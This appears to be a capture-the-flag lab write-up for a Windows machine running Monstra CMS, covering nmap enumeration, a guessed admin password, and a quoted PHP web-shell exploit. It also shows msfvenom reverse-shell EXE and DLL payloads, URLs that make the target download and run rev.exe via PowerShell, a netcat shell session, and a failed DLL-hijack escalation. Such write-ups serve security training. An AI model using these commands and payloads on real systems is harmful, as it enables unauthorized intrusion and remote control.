# Monster

# Enumeration

## nmap

```bash
# Nmap 7.91 scan initiated Mon Mar 21 09:37:07 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Monster/results/192.168.137.180/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Monster/results/192.168.137.180/scans/xml/_full_tcp_nmap.xml" 192.168.137.180
adjust_timeouts2: packet supposedly had rtt of -363411 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -363411 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -360205 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -360205 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -363669 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -363669 microseconds.  Ignoring time.
Nmap scan report for 192.168.137.180
Host is up, received user-set (0.18s latency).
Scanned at 2022-03-21 09:37:08 EDT for 318s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_http-title: Mike Wazowski
443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_http-title: Mike Wazowski
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2022-03-21T13:42:18+00:00
| ssl-cert: Subject: commonName=Mike-PC
| Issuer: commonName=Mike-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-21T06:47:51
| Not valid after:  2022-08-23T06:47:51
| MD5:   281f b090 3092 f666 23ba d039 e20c 8767
| SHA-1: 072a 7875 6db4 d5ce 3405 4e9e 2393 8bd0 65b8 340a
| -----BEGIN CERTIFICATE-----
| MIIC0jCCAbqgAwIBAgIQNUPIdFHv5ZZKespL0jly/DANBgkqhkiG9w0BAQsFADAS
| MRAwDgYDVQQDEwdNaWtlLVBDMB4XDTIyMDIyMTA2NDc1MVoXDTIyMDgyMzA2NDc1
| MVowEjEQMA4GA1UEAxMHTWlrZS1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAMj0kOMmLbpbUoDCLtS7ET/9KIc/AEtfXhArjm9QVrtP8wuAus8wXZ70
| JpCcGjpfw61f9oueHkevy9t60EEZ4CRMLlRwRN1t29MRmP9FcAoEf2YvOT3N1yMW
| qpvLuBXVOGMOeXjGv6vIaXNr8wgu4zem9EIEVL0j6NDIs/JkzMxc0UntjKq4lQii
| LIDYI+yv38IVd2oaQtLkChPT1yW+0c8B3SApEnfL8mUvxrSkJKR7jF4FPZhZg3D5
| kSDL08Fb5FQabX499mhKEd3+kaZD1PBuR+V2HRtzb9pQ2/wmfsf1rscHMADnpszg
| gKzQMJu1yLiqlfQh0H8wZARFRUrvMN0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQCUj6Wylp314Imj
| ytPovAgYJxtFVcuUxRbGyk8bamtsyxM41rcCDBTRyG2No4bFinjQ19Jh/OjOuUtB
| I/NPovY+DH98IccGN3TBBnfzby1MGqJeS2OhB5ZBdllKrydhwtsZ3vjENOSCZeLg
| WFGeWkT7rN6LtK4B22i93DaAbur0+tfcvvTRJ9j2SIRjR0NLgPvnY7LgcdYCuvTG
| TzHKBPttwRpj91T5aL/s5b3YkLRevR/jiQDnV6q9W7p3LMIn2Wf4IqFsCOLJXcZ/
| L/+djiq59xAEyh66b4HeOKZcfJCLNrYeVLWxNMrc3FTLLANSDaqeM5eEUez2/PoO
| hbrT4btE
|_-----END CERTIFICATE-----
|_ssl-date: 2022-03-21T13:42:24+00:00; -1s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|98 (86%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_98
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (86%), Microsoft Windows 98 SE (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=3/21%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=623880C2%P=x86_64-pc-linux-gnu)
SEQ(SP=F7%GCD=1%ISR=110%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   176.41 ms 192.168.49.1
2   176.47 ms 192.168.137.180

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 21 09:42:26 2022 -- 1 IP address (1 host up) scanned in 318.65 seconds
```

## 80 - Web

![](Pasted%20image%2020220321214125.png)

```
403       42l       97w        0c http://192.168.137.180/.htaccess.jsp
301        9l       30w      342c http://192.168.137.180/Blog
200      539l     1442w    22916c http://192.168.137.180/Index.html
301        9l       30w      344c http://192.168.137.180/assets
```

![](Pasted%20image%2020220321214158.png)

### Add Virtual Host

```bash
┌──(kali㉿kali)-[/tmp]
└─$ cat /etc/hosts | grep monster
192.168.137.180 monster.pg
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

### Credentials

![](Pasted%20image%2020220321214339.png)

![](Pasted%20image%2020220321215104.png)


Guessed `admin:wazowski` which worked

### Registration?


![](Pasted%20image%2020220321215245.png)

Captcha code is wrong

### CVEs

```bash
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit monstra
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Monstra CMS 1.2.0 - 'login' SQL Injection                                                                                             | php/webapps/38769.txt
Monstra CMS 1.2.1 - Multiple HTML Injection Vulnerabilities                                                                           | php/webapps/37651.html
Monstra CMS 3.0.3 - Multiple Vulnerabilities                                                                                          | php/webapps/39567.txt
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution                                                     | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                                                                         | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                                                                               | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                                                                                    | php/webapps/44502.txt
Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                                                                             | php/webapps/49949.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                                                                        | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                                                                        | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                                                                    | php/webapps/45164.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Format String Exploitation Demonstration [LINUX]                                                                                      | english/12995-format-string-expl
Frame Pointer Overwrite Demonstration [LINUX]                                                                                         | english/12994-frame-pointer-over
Simple Buffer Overflow Demonstration                                                                                                  | english/13201-simple-buffer-over
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

# Exploit

## Guess Credentials

Guessed `admin:wazowski` which worked

![](Pasted%20image%2020220321221919.png)

## CVE Test 1

```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 43348
  Exploit: Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/43348
     Path: /usr/share/exploitdb/exploits/php/webapps/43348.txt
File Type: C source, UTF-8 Unicode text

Copied to: /tmp/43348.txt


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat 43348.txt                
Exploit Title: Monstra CMS - 3.0.4 RCE
Vendor Homepage: http://monstra.org/
Software Link:
https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
Discovered by: Ishaq Mohammed
Contact: https://twitter.com/security_prince
Website: https://about.me/security-prince
Category: webapps
Platform: PHP
Advisory Link: https://blogs.securiteam.com/index.php/archives/3559

Description:

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.

Vulnerable Code:

https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php
line 19:

 public static function main()
    {
        // Array of forbidden types
        $forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
                                 'php', 'phtml', 'php3', 'php4', 'php5',
'phps',
                                 'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh',
'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
                                 'exe', 'scr', 'dll', 'msi', 'vbs', 'bat',
'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');

Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

           <?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.


Recommended Patch:
We were not able to get the vendor to respond in any way, the software
appears to have been left abandoned without support – though this is not an
official status on their site (last official patch was released on
2012-11-29), the GitHub appears a bit more active (last commit from 2 years
ago).

The patch that addresses this bug is available here:
 https://github.com/monstra-cms/monstra/issues/426                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

![](Pasted%20image%2020220321222233.png)

![](Pasted%20image%2020220321222533.png)

![](Pasted%20image%2020220321222518.png)

However, failed to upload

### modify mike user

![](Pasted%20image%2020220321224336.png)

![](Pasted%20image%2020220321224323.png)

![](Pasted%20image%2020220321224311.png)

Mike is modified, but he cannot upload user

### Enumeration

![](Pasted%20image%2020220321224627.png)

## CVE 2
https://github.com/monstra-cms/monstra/issues/470

![](Pasted%20image%2020220321225621.png)

![](Pasted%20image%2020220321225900.png)


![](Pasted%20image%2020220321225946.png)

![](Pasted%20image%2020220321230739.png)

![](Pasted%20image%2020220321230855.png)

## Revshell

![](Pasted%20image%2020220321230555.png)

Doesn't upload

Generate payload

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.137 LPORT=3389  -f exe -o rev.exe                                                                    2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.137.180 - - [21/Mar/2022 11:12:02] "GET /rev.exe HTTP/1.1" 200 -
192.168.137.180 - - [21/Mar/2022 11:12:25] "GET /rev.exe HTTP/1.1" 200 -
```

Visit these urls

```
http://monster.pg/blog/blog?c=powershell+-c+%22wget+192.168.49.137%2Frev.exe+-O+rev.exe%22
http://monster.pg/blog/blog?c=rev.exe
```

```powershell
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 3389                                                                           
listening on [any] 3389 ...
connect to [192.168.49.137] from (UNKNOWN) [192.168.137.180] 59714
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\blog>cd \Users\Mike\Desktop
cd \Users\Mike\Desktop

C:\Users\Mike\Desktop>type local.txt
type local.txt
364838981a89f023031c98811300f154

C:\Users\Mike\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.137.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.137.254

C:\Users\Mike\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\Mike\Desktop>
```

![](Pasted%20image%2020220321231402.png)

# Privesc

## DLL Injection fail

https://infosecwriteups.com/ikeext-dll-hijacking-3aefe4dde7f5

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.137 LPORT=3389  -f dll -o wlbsctrl.dll                                                             130 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
Saved as: wlbsctrl.dll
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ nano rasphone.pbk
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat r               
cat: r: No such file or directory
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat rasphone.pbk                                                                                                                                                1 ⨯
[IKEEXT]
MEDIA=rastapi
Port=VPN2-0
Device=Wan Miniport (IKEv2)
DEVICE=vpn
PhoneNumber=127.0.0.1
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```powershell
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 3389
listening on [any] 3389 ...
connect to [192.168.49.137] from (UNKNOWN) [192.168.137.180] 52529
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\blog>sc query IKEEXT
sc query IKEEXT

SERVICE_NAME: IKEEXT 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\xampp\htdocs\blog>

C:\xampp\htdocs\blog>cd \Users\Mike\Desktop
cd \Users\Mike\Desktop

C:\Users\Mike\Desktop>powershell -c "wget 192.168.49.137/rasphone.pbk -O rasphone.pbk"
powershell -c "wget 192.168.49.137/rasphone.pbk -O rasphone.pbk"

C:\Users\Mike\Desktop>rasdial IKEEXT test test /PHONEBOOK:rasphone.pbk
rasdial IKEEXT test test /PHONEBOOK:rasphone.pbk
Connecting to IKEEXT...
Verifying username and password...
Connecting to IKEEXT...
Connecting to IKEEXT...
Connecting to IKEEXT...

Remote Access error 800 - The remote connection was not made because the attempted VPN tunnels failed. The VPN server might be unreachable. If this connection is attempting to use an L2TP/IPsec tunnel, the security parameters required for IPsec negotiation might not be configured properly.

For more help on this error:
        Type 'hh netcfg.chm'
        In help, click Troubleshooting, then Error Messages, then 800

C:\Users\Mike\Desktop>wget 192.168.49.137/wlbsctrl.dll -O wlbsctrl.dll
wget 192.168.49.137/wlbsctrl.dll -O wlbsctrl.dll
'wget' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Mike\Desktop>powershell -c "wget 192.168.49.137/wlbsctrl.dll -O wlbsctrl.dll"
powershell -c "wget 192.168.49.137/wlbsctrl.dll -O wlbsctrl.dll"

C:\Users\Mike\Desktop>rasdial IKEEXT test test /PHONEBOOK:rasphone.pbk
rasdial IKEEXT test test /PHONEBOOK:rasphone.pbk
Connecting to IKEEXT...
Verifying username and password...
Connecting to IKEEXT...
Connecting to IKEEXT...
Connecting to IKEEXT...

Remote Access error 800 - The remote connection was not made because the attempted VPN tunnels failed. The VPN server might be unreachable. If this connection is attempting to use an L2TP/IPsec tunnel, the security parameters required for IPsec negotiation might not be configured properly.

For more help on this error:
        Type 'hh netcfg.chm'
        In help, click Troubleshooting, then Error Messages, then 800

C:\Users\Mike\Desktop>
```

# Other